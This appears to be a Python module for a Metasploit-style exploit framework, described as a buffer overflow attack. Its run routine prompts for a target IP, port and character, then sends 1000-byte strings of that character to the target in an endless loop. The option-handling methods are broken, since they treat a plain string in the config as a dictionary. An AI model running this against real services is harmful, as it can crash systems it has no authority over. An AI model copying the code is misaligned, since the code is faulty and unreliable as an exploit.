import socket
import sys
import time
import json
from colorama import Fore, Style

class Exploit:
	config={
		"Text":"No Options For This Exploit Click run For Option"
	}
	def show_options(self):
		print(Fore.YELLOW+"Options\t\tNecessity\t\tDefault"+Style.RESET_ALL)
		print(Fore.YELLOW+"-------\t\t---------\t\t-------"+Style.RESET_ALL)
		for key in sorted(self.config.keys()):
			print(Fore.YELLOW+"%s\t\t%s\t\t\t%s" % (
				key, self.config[key]["necessity"], self.get_config(key))+Style.RESET_ALL)
	

	@staticmethod
	def show_info():
		print(Fore.YELLOW+"\nThis exploit tries to do a buffer \noverflow to the given ip and port"+Style.RESET_ALL)

	
	def set_config(self, key, value):
		if key in self.config.keys():
			self.config[key]["default"] = value
		else:
			print("No options")
	
	
	def get_config(self, key):
		return self.config[key]["default"]

	@staticmethod
	def run():
		RHOST=input("RHOST: ")
		RPORT=input("RPORT: ")
		CHAR =input("CHAR: ")
		print(Fore.CYAN+"[+]"+Style.RESET_ALL+" Fuzzing Server")
		print(Fore.YELLOW+"[+]"+Style.RESET_ALL+" Click ctrl+C to stop it ...")
		while True:
			try:
				sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				sock.connect((RHOST, int(RPORT)))
					
				payload=CHAR*1000
				sock.send(bytes(payload, encoding='utf-8'))
				sock.close()
			except KeyboardInterrupt:
				print("\n^C Detected")
				exit()
			except Exception as e:
				print(e)
